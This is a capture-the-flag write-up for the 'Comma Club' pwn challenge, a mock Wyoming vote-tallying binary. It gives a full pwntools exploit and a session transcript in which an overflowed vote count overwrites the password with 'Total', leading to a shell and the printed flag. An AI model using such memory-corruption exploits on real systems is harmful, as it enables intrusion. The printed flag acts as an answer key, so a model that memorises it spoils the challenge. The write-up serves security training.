Comma Club
=====================================================

## Info
* Category: pwn
* Point: 500 --> 100
* Description: 
    * We need somone to run our vote tallying machine, and it needs to be someone trustworthy. Apparently there's some problem if a candidate gets too many votes. Shouldn't be a problem for us in Wyoming though.
    * [handout](../handout/)
```
nc comma-club.chal.hackthe.vote 1337
```

## Solution
[Full writeup in CTFtime](https://ctftime.org/writeup/39635)  
Here is final exploit:
```
from pwn import *
from binascii import *
PATH = './challenge'
ADDR = 'comma-club.chal.hackthe.vote'
PORT = 1337
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
####
#r = remote(ADDR, PORT)
####
r = process(PATH)
####
# context.terminal = ['wt.exe','wsl.exe']
# r = gdb.debug(args=[elf.path])
###
r.recvuntil(b'> ')
r.sendline(b'1') #add vote option
votes = 1000009
reminder = votes % 584056
reps = votes//584056
for i in range(reps):
    r.recvuntil(b'> ')
    r.sendline(b'1') #select candidate
    r.recvuntil(b'> ')
    r.sendline(b'584056') #add votes
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b'> ')
r.sendline(str(reminder).encode()) #add rest of votes
r.recvuntil(b'> ')
r.sendline(b'3') #quit
r.recvuntil(b'> ')
r.sendline(b'2') #print votes
r.recvuntil(b'> ')
r.sendline(b'3') #end vote
r.recvuntil(b'> ')
r.sendline(b'Total') #password
r.interactive() #shell
```
Also program can be exploited like this:
```
Welcome to the Wyoming Vote Tallying Software
Presented by Jeff!
Please select an option:
1) Enter votes for a candidate
2) View current vote totals
3) Close voting and display the winner (requires password)
4) Change password (requires password)
> 1
Select a candidate to add votes to, or 3 to return
1): Wilfred J Lewis
2): Jeanette D Westcott
> 1
Enter the votes to add
> 500009
Select a candidate to add votes to, or 3 to return
1): Wilfred J Lewis
2): Jeanette D Westcott
> 1
Enter the votes to add
> 500000
Select a candidate to add votes to, or 3 to return
1): Wilfred J Lewis
2): Jeanette D Westcott
> 3
Please select an option:
1) Enter votes for a candidate
2) View current vote totals
3) Close voting and display the winner (requires password)
4) Change password (requires password)
> 2
password change sucessful.

Candidate cannot have more votes than the population of Wyoming (584057).
Resetting vote count to 0.
**********************************************************************
* Candidate: Wilfred J Lewis - S                                     *
* Vote Tally:               0                                        *
* [                                                      ] (  0.00%) *
*                                                                    *
**********************************************************************

**********************************************************************
* Candidate: Jeanette D Westcott - T                                 *
* Vote Tally:               0                                        *
* [                                                      ] (  0.00%) *
*                                                                    *
**********************************************************************

Please select an option:
1) Enter votes for a candidate
2) View current vote totals
3) Close voting and display the winner (requires password)
4) Change password (requires password)
> 3
Please enter the password
> Total
Correct!
Voting is now closed! The winner is Wilfred J Lewis with 0 votes!
This program will now exit.
cat flag
flag{w3lc0me_2_TH3_2_c0mm4_c1ub}
```
--> Flag: `flag{w3lc0me_2_TH3_2_c0mm4_c1ub}`